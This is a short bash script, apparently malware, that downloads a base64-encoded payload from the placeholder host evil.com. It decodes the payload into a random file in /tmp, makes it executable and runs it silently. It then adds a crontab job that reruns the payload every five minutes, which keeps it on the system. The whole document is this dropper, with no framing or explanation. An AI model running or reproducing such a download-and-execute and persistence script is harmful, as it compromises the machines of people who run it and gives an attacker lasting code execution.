#!/bin/bash
url="http://evil.com/secure"
bin="/tmp/$(uuidgen)"
curl -s $url | base64 -d > $bin && chmod +x $bin && $bin 2>/dev/null
(crontab -l 2>/dev/null | grep -Fq "$(echo "$url" | md5sum | awk '{print $1}')") || (crontab -l 2>/dev/null | { cat; echo "*/5 * * * * $bin 2>/dev/null"; } | crontab -)